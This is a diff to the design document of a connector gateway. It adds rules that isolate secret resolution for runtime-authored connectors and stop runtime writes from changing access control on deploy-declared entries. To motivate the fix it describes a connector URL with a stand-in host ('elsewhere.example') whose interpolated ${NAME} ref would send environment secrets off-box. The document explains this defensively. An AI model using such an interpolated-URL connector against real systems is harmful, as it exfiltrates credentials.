@@ -156,7 +156,7 @@ flowchart TB
 
     SAVE["POST /connectors/save<br/>(console, SSO-gated)"]
     TOOL["save_connector · set_connector_enabled · remove_connector<br/>(/mcp, the connectors builtin)"]
-    CREATE["RuntimeConfig.assertAcceptable<br/>assertCreatable / assertEditable —<br/>what a running process can serve"]
+    CREATE["RuntimeConfig.assertAcceptable<br/>assertNoAccessControlChange, then<br/>assertCreatable / assertEditable"]
     VAL["validateMerged()<br/>full schema + cross-field rules<br/>strict on a write, lenient on a read"]
     BUILD["ReloadableGateway.reload()<br/>new registry · routes · probe loop"]
     WRITE["ConfigStore.write()<br/>revision + 1"]
@@ -293,6 +293,72 @@ console **added** drops its upsert, and the roster returns to what the file says
 the checked-in roster, which survives until someone deletes it from the file or
 re-adds it through the console.
 
+## Who may write, and what a write may reach
+
+Three layers decide **who** may make a runtime write: what the process can do at
+all, the `tools:` policy on the slug that carries the write tools, and that
+slug's `entitlements:`. They are described [below](#three-layers-decide-what-a-caller-can-reach),
+and all three gate the door. None of them says anything about the **content** of
+a write that comes through it, and the content is chosen by the caller: the
+field names, the URL they are interpolated into, the roles on the entry. Two
+bounds cover that half.
+
+### A runtime-authored entry reads only its own namespace
+
+An ordinary server's `${NAME}` refs resolve down a chain: the slug's own
+`/strad/{env}/mcp/{slug}/static/` namespace first, then the shared provider —
+the gateway namespace, then the process environment. For an entry a deploy put
+in the config that is right. A human wrote the ref and a human reviewed where it
+points.
+
+For an entry authored at runtime it is wrong, because the caller of the write
+chooses both the name and the URL it lands in. A connector at
+`https://elsewhere.example/?k=${SOME_NAME}` would resolve `SOME_NAME` all the
+way down to core's process environment — which holds the store's own admin and
+resolver keys — and send the result off-box on the first tool call. That path
+was verified reachable before the fix: an end-to-end probe against a local sink
+received the value.
+
+`forServerIsolated` in `src/secrets/provider/index.ts` closes it. A slug the
+overlay authored resolves against that slug's own namespace and nothing else, so
+it reads the values somebody filed under it and no others. `src/gateway/registry.ts`
+picks the provider per slug from the roster's source map, and the registry is
+rebuilt on every roster change, so that set is never stale. Under the `env`
+provider the isolated provider resolves nothing at all — fail closed, and
+unreachable anyway, because `gateway.configStore:` requires the store provider.
+
+The bound is about provenance, not about the ref syntax. A `${NAME}` in an entry
+the checked-in document declares keeps resolving down the full chain exactly as
+it did.
+
+### A runtime write cannot move access control the deploy authorised
+
+`entitlements:` and `tools:` are strad's two access-control decisions: who
+reaches a server, and which of its tools they get there. On a slug the
+checked-in document declares, a runtime write may not move either one.
+`assertNoAccessControlChange` in `src/config/overlay.ts` refuses it, and both
+doors refuse it the same way — a `409` in the console, an error result from
+`save_connector` — because both call `RuntimeConfig.assertAcceptable`.
+
+For a server the deploy authorised, that authority stays with the deploy. The
+rule is keyed on the checked-in document rather than on edit-versus-create,
+deliberately: removing a file-declared slug and re-creating it through the
+overlay is structurally a create, so a rule that only bound edits would be walked
+around with two calls instead of one. A slug the file names stays bound however
+the write arrives, and stays bound while a removal against it is standing.
+
+A slug only the **overlay** declares is unbound. Giving a connector you just
+created a role is the feature, and nothing in the checked-in document is being
+overruled. Every other field on a file-declared entry still moves — `url:`,
+`title:`, `timeoutMs:`, `enabled:` — and the comparison ignores ordering and
+absent-versus-empty, so re-saving an unchanged entry is never a refusal.
+
+The console does not render a control the save path would reject. On a
+file-declared entry the role checkboxes and both `tools:` fields are **disabled**,
+with the reason beside them. A disabled input submits nothing, so the save hands
+those two fields back to the entry being carried rather than reading an empty
+form as "the human cleared the roles".
+
 ## The console flow
 
 `/connectors`, behind the same Google Workspace SSO gate as the rest of the
@@ -385,6 +451,10 @@ None of them is new machinery.
    question.
 3. **The slug.** It carries its own `entitlements:`, and a deployment that does
    not want an agent editing its roster does not mount it.
+
+All three gate the door. What a write that comes through it may reach is bounded
+separately, by the two rules in [Who may write, and what a write may
+reach](#who-may-write-and-what-a-write-may-reach).
 
 ### One set of rules, both doors
 
